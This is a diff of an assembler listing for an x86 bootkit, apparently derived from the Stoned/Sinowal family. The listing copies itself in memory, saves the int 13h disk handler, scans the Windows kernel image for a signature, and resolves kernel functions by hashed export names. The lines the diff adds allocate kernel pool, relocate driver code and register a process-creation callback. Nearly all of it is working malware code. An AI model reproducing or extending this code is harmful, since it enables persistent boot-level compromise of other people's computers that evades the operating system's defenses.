@@ -16,7 +16,7 @@
     16                                  
     17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
     18 00000010 BE007E                  mov si,7e00h
-    19 00000013 66B9[61040000]          mov ecx,Total_End_of_Binary
+    19 00000013 66B9[DF040000]          mov ecx,Total_End_of_Binary
     20 00000019 F3A4                    rep movsb
     21                                  
     22                                  ; backup old int 13h vector
@@ -303,7 +303,7 @@
    288 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
    289 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
    290 00000241 81EF00080000            sub edi,2048;
-   291 00000247 B964010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
+   291 00000247 B9E2010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
    292 0000024C 57                      push edi
    293 0000024D F3A4                    rep movsb
    294 0000024F 5F                      pop edi
@@ -610,105 +610,173 @@
    595 000003C6 E81C000000              call dword Obfuscation_Call
    596                                  
    597                                  ; standard API hashes (all of ntoskrnl)
-   598 000003CB 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24
-   599 000003CF 1F9D489D                ExFrePool         dd    09D489D1Fh  ; ebp-20
-   600 000003D3 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused)
-   601 000003D7 5F4CD4DC                ZwClose           dd    0DCD44C5Fh  ; ebp-12
-   602 000003DB 9D8F8803                ZwCreateFile      dd    003888F9Dh  ; ebp-8
-   603 000003DF 16D5FC84                ZwReadFile        dd    084FCD516h  ; ebp-4
-   604 000003E3 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
-   605                                  ; here execution flow goes on..
-   606                                  Obfuscation_Call:
-   607                                  ; get absolute address of PE Image the exception handler exists in, to scan it
-   608 000003E7 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
-   609 000003EA 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
-   610 000003ED 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
-   611                                  
-   612                                  ; scan 74 E3 39 05
-   613                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
-   614                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
-   615                                  ; 74 DB 
-   616 000003EF B074                    mov al,74h
-   617                                  Scan_PsLoadedModuleList:
-   618 000003F1 F2AE                    repne scasb
-   619 000003F3 7515                    jnz Image_Parsing_done
-   620 000003F5 817FFF74E33905          cmp dword [edi-1],0x0539E374
-   621 000003FC 75F3                    jnz Scan_PsLoadedModuleList
-   622 000003FE 66817F0774DB            cmp word [edi + 7],0xdb74
-   623 00000404 75EB                    jnz Scan_PsLoadedModuleList
-   624                                  
-   625                                  Found_Signature:
-   626 00000406 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
-   627 00000407 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
-   628                                  
-   629                                  Image_Parsing_done:
-   630                                  ; use Export Table of the PE Image to resolve the hashes
-   631 0000040A 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
-   632 0000040D 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
-   633 0000040F 31C9                    xor ecx,ecx
-   634 00000411 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
-   635                                  
-   636                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
-   637 00000412 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
-   638                                  
-   639                                  Next_Export:
-   640                                  ;  ecx      export counter
-   641                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
-   642                                  ;  esi      Export Name
-   643                                  ;  edi      Hash Value
-   644                                  ;  [esp]    Pointer to Next Hash
-   645                                  ;  ebp      Pointer to Stack Variables
-   646 00000414 41                      inc ecx   ; next function to generate hash of (ecx = counter)
-   647 00000415 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
-   648 00000418 01DE                    add esi,ebx    ;  (absolute address)
-   649 0000041A 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
-   650 0000041D 01DE                    add esi,ebx     ;  (absolute address)
-   651                                  
-   652 0000041F 31C0                    xor eax,eax   ; will hold character (zero extended)
-   653 00000421 31FF                    xor edi,edi   ; will hold hash value
-   654                                  
-   655                                  Generate_Hash_of_Export_Name:
-   656                                  ; generates the hash of the name string, += n >> 13 is used
-   657 00000423 AC                      lodsb
-   658 00000424 08C0                    or al,al  ; zero termination?
-   659 00000426 7407                    jz Hash_Generated 
-   660 00000428 C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
-   661 0000042B 01C7                    add edi,eax    ; add to hash value
-   662 0000042D EBF4                    jmp short Generate_Hash_of_Export_Name
-   663                                  
-   664                                  Hash_Generated:
-   665                                  ; krrr
-   666 0000042F 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
-   667 00000432 AD                      lodsd   ; get next hash
-   668 00000433 09C0                    or eax,eax 
-   669 00000435 7421                    jz All_Hashes_Resolved    ; if yes exit loop
-   670 00000437 39C7                    cmp edi,eax       ; found correct hash?
-   671 00000439 75D9                    jnz Next_Export   ; if not => next export
-   672 0000043B 893424                  mov [esp],esi     ; update hash pointer
-   673 0000043E 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
-   674 00000441 01DF                    add edi,ebx    ;   (absolute address)
-   675 00000443 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
-   676 00000447 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
-   677 0000044A 01DF                    add edi,ebx                ;   (absolute address)
-   678 0000044C 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
-   679 0000044F 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
-   680                                  
-   681                                  Resolve_Next_Hash_StoreOnStack:
-   682 00000451 87FD                    xchg edi,ebp    ; edi to point to stack variables
-   683 00000453 AB                      stosd   ; store eax to variable
-   684 00000454 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
-   685 00000456 EBBC                    jmp short Next_Export
+   598                                  ; must in the correct order.
+   599 000003CB 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24 203
+   600 000003CF 1F9D489D                ExFreePool         dd    09d489d1fh  ; ebp-20 228
+   601 000003D3 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused) 852
+   602 000003D7 5F4CD4DC                NtClose           dd    0DCD44C5Fh  ; ebp-12 1879
+   603 000003DB 9D8F8803                NtCreateFile      dd    003888F9Dh  ; ebp-8 1888
+   604                                  ; 842de457
+   605 000003DF 57E42D84                PsSetCreateProcessNotifyRoutine dd    0842de457h  ; ebp-4 1347
+   606                                  ;NtReadFile        dd    084FCD516h  ; ebp-4 1995
+   607 000003E3 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
+   608                                  ; here execution flow goes on..
+   609                                  Obfuscation_Call:
+   610                                  ; get absolute address of PE Image the exception handler exists in, to scan it
+   611 000003E7 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
+   612 000003EA 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
+   613 000003ED 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
+   614 000003EF 81C700100000            add edi, 0x1000
+   615 000003F5 81E700F0FFFF            and edi,0xFFFFF000   ; page base address
+   616 000003FB 81E900100000            sub ecx,0x1000
+   617                                  
+   618                                  ; scan 74 E3 39 05
+   619                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
+   620                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
+   621                                  ; 74 DB 
+   622 00000401 B074                    mov al,74h
+   623                                  Scan_PsLoadedModuleList:
+   624 00000403 F2AE                    repne scasb
+   625 00000405 7515                    jnz Image_Parsing_done
+   626 00000407 817FFF74E33905          cmp dword [edi-1],0x0539E374
+   627 0000040E 75F3                    jnz Scan_PsLoadedModuleList
+   628 00000410 66817F0774DB            cmp word [edi + 7],0xdb74
+   629 00000416 75EB                    jnz Scan_PsLoadedModuleList
+   630                                  
+   631                                  Found_Signature:
+   632 00000418 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
+   633 00000419 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
+   634                                  
+   635                                  Image_Parsing_done:
+   636                                  ; use Export Table of the PE Image to resolve the hashes
+   637 0000041C 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
+   638 0000041F 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
+   639 00000421 31C9                    xor ecx,ecx
+   640 00000423 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
+   641                                  
+   642                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
+   643 00000424 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
+   644                                  
+   645                                  Next_Export:
+   646                                  ;  ecx      export counter
+   647                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
+   648                                  ;  esi      Export Name
+   649                                  ;  edi      Hash Value
+   650                                  ;  [esp]    Pointer to Next Hash
+   651                                  ;  ebp      Pointer to Stack Variables
+   652 00000426 41                      inc ecx   ; next function to generate hash of (ecx = counter)
+   653 00000427 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
+   654 0000042A 01DE                    add esi,ebx    ;  (absolute address)
+   655 0000042C 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
+   656 0000042F 01DE                    add esi,ebx     ;  (absolute address)
+   657                                  
+   658 00000431 31C0                    xor eax,eax   ; will hold character (zero extended)
+   659 00000433 31FF                    xor edi,edi   ; will hold hash value
+   660                                  
+   661                                  Generate_Hash_of_Export_Name:
+   662                                  ; generates the hash of the name string, += n >> 13 is used
+   663 00000435 AC                      lodsb
+   664 00000436 08C0                    or al,al  ; zero termination?
+   665 00000438 7407                    jz Hash_Generated 
+   666 0000043A C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
+   667 0000043D 01C7                    add edi,eax    ; add to hash value
+   668 0000043F EBF4                    jmp short Generate_Hash_of_Export_Name
+   669                                  
+   670                                  Hash_Generated:
+   671                                  ; krrr
+   672 00000441 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
+   673 00000444 AD                      lodsd   ; get next hash
+   674 00000445 09C0                    or eax,eax 
+   675 00000447 7421                    jz All_Hashes_Resolved    ; if yes exit loop
+   676 00000449 39C7                    cmp edi,eax       ; found correct hash?
+   677 0000044B 75D9                    jnz Next_Export   ; if not => next export
+   678 0000044D 893424                  mov [esp],esi     ; update hash pointer
+   679 00000450 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
+   680 00000453 01DF                    add edi,ebx    ;   (absolute address)
+   681 00000455 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
+   682 00000459 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
+   683 0000045C 01DF                    add edi,ebx                ;   (absolute address)
+   684 0000045E 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
+   685 00000461 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
    686                                  
-   687                                  All_Hashes_Resolved:
-   688 00000458 90                      nop
-   689 00000459 08C0                    or al, al
-   690 0000045B 08C0                    or al, al
-   691 0000045D 90                      nop
+   687                                  Resolve_Next_Hash_StoreOnStack:
+   688 00000463 87FD                    xchg edi,ebp    ; edi to point to stack variables
+   689 00000465 AB                      stosd   ; store eax to variable
+   690 00000466 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
+   691 00000468 EBBC                    jmp short Next_Export
    692                                  
-   693                                  ;mov esp,ebp 
-   694 0000045E 9D                      popfd
-   695 0000045F 61                      popad
-   696 00000460 C3                      ret
-   697                                  
-   698                                  Total_End_of_Binary:
-   699 00000461 00<rept>                times 4*1024-($-$$) db 0
+   693                                  All_Hashes_Resolved:
+   694 0000046A 90                      nop
+   695 0000046B 08C0                    or al, al
+   696 0000046D 08C0                    or al, al
+   697 0000046F 90                      nop
+   698                                  ; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory
+   699                                  ; nt!ExAllocatePool(Type 0, 8192 bytes)
+   700 00000470 6800200000              push dword 8192 ; NumberOfBytes = 8192 bytes
+   701 00000475 6A00                    push dword 0   ; PoolType = 0
+   702 00000477 FF55E8                  call dword [ebp - 24]     ; ExAllocatePool()
+   703                                  
+   704 0000047A 09C0                    or eax,eax     ; valid buffer?
+   705 0000047C 744A                    jz Exit_Bootkit
+   706                                  
+   707 0000047E 89C7                    mov edi,eax     ; copy the code
+   708 00000480 8B75E0                  mov esi,[ebp - 32]       ; the pointer to the import terminator
+   709 00000483 81C6B6000000            add esi,Driver_Code - Obfuscation_Call +4    ; use that absolute pointer (+ 4 to seek after the terminator)
+   710 00000489 B946000000              mov ecx,Total_End_of_Binary - Driver_Code
+   711 0000048E F3A4                    rep movsb
+   712                                  
+   713                                  ; initialize the data pointer [ebp-32]
+   714 00000490 8945E0                  mov [ebp - 32],eax                                                              ; will point to the data
+   715 00000493 8345E03A                add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point
+   716                                  
+   717 00000497 FFE0                    jmp eax ; jump to execute Driver_Code
+   718                                  
+   719                                  Driver_Code:
+   720 00000499 90                      nop
+   721 0000049A 90                      nop
+   722 0000049B 90                      nop
+   723                                  ; [ebp - 32] = data reference
+   724                                  
+   725                                  ; store the ntoskrnl base address
+   726 0000049C 8B75E0                  mov esi,[ebp - 32] 
+   727 0000049F 891E                    mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address
+   728                                  
+   729                                  ; allocate a memory pool (1024 bytes) for the Stoned Subsystem
+   730                                  ; nt!ExAllocatePool(Type 0, 1024 bytes)
+   731 000004A1 6800040000              push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
+   732 000004A6 6A00                    push dword 0                                                                    ; PoolType = 0
+   733 000004A8 FF55E8                  call dword [ebp - 24]                                                           ; ExAllocatePool()
+   734 000004AB 09C0                    or eax,eax                                                                      ; valid buffer?
+   735 000004AD 7419                    jz Exit_Bootkit
+   736 000004AF 894608                  mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
+   737 000004B2 C7460400000000          mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback
+   738                                  
+   739 000004B9 B806000000              mov eax, Data_Reference-MyCreateProcessNotifyRoutine
+   740 000004BE 29C6                    sub esi,eax
+   741 000004C0 6A00                    push 0
+   742 000004C2 56                      push esi
+   743 000004C3 FF55FC                  call dword [ebp - 4] 
+   744 000004C6 EB00                    jmp Exit_Bootkit
+   745                                  
+   746                                  ; return from bootkit to Windows
+   747                                  Exit_Bootkit:
+   748 000004C8 89EC                    mov esp,ebp 
+   749 000004CA 9D                      popfd
+   750 000004CB 61                      popad
+   751 000004CC C3                      ret
+   752                                  
+   753                                  MyCreateProcessNotifyRoutine:
+   754 000004CD 90                      nop
+   755 000004CE 90                      nop
+   756 000004CF 90                      nop
+   757 000004D0 C20C00                  ret 0ch
+   758                                  
+   759                                  ; data following, [ebp - 32] will point to here
+   760                                  Data_Reference:
+   761                                  Subsystem_Variables:
+   762 000004D3 00000000                Ntoskrnl_BaseAddress        dd  0
+   763 000004D7 00000000                Callback_NotifyDriverLoad   dd  0
+   764 000004DB 00000000                Memory_Pool                 dd  0
+   765                                  
+   766                                  Total_End_of_Binary:
+   767 000004DF 00<rept>                times 4*1024-($-$$) db 0
